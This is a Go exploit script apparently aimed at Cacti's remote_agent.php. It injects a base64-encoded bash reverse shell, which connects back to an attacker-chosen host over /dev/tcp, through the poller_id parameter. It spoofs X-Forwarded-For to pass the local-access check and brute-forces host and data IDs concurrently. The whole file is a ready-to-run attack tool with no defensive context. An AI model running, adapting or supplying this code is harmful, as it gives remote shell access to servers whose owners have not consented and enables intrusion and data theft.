package main

import (
	"encoding/base64"
	"flag"
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"sync"
	"time"
)

func randomUserAgent() string {
	uaList := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
	}
	return uaList[rand.Intn(len(uaList))]
}

func exploit(targetURL, rsHost, rsPort string) {
	localCactiIP := targetURL // TODO: Extract the local IP from the URL
	client := &http.Client{}

	revShell := fmt.Sprintf("bash -c 'exec bash -i &>/dev/tcp/%s/%s <&1'", rsHost, rsPort)
	encodedRevShell := base64.StdEncoding.EncodeToString([]byte(revShell))
	payload := fmt.Sprintf(";echo %s | base64 -d | bash -", encodedRevShell)
	encodedPayload := url.QueryEscape(payload)

	var wg sync.WaitGroup
	sem := make(chan bool, 20) // limiting concurrency to 20 goroutines

	for hostID := 1; hostID <= 100; hostID++ {
		for localDataIDs := 1; localDataIDs <= 100; localDataIDs++ {
			wg.Add(1)
			sem <- true
			go func(hID, lDataID int) {
				defer wg.Done()
				defer func() { <-sem }()
				finalURL := fmt.Sprintf("%s/remote_agent.php?action=polldata&local_data_ids[]=%d&host_id=%d&poller_id=1%s", targetURL, lDataID, hID, encodedPayload)
				req, err := http.NewRequest("GET", finalURL, nil)
				if err != nil {
					fmt.Println(err)
					return
				}
				req.Header.Set("User-Agent", randomUserAgent())
				req.Header.Set("X-Forwarded-For", localCactiIP)

				resp, err := client.Do(req)
				if err != nil {
					fmt.Println(err)
					return
				}
				defer resp.Body.Close()

				// Printing status (you might want to print the body or handle it as needed)
				fmt.Printf("%d - %s\n", resp.StatusCode, resp.Status)
			}(hostID, localDataIDs)
		}
	}

	wg.Wait()
}

func main() {
	rand.Seed(time.Now().UnixNano())

	urlPtr := flag.String("url", "", "Target URL (e.g. http://192.168.1.100/cacti)")
	remoteIP := flag.String("remote_ip", "", "Reverse shell IP to connect to")
	remotePort := flag.String("remote_port", "", "Reverse shell port to connect to")

	flag.Parse()

	if *urlPtr == "" || *remoteIP == "" || *remotePort == "" {
		flag.Usage()
		return
	}

	exploit(*urlPtr, *remoteIP, *remotePort)
}
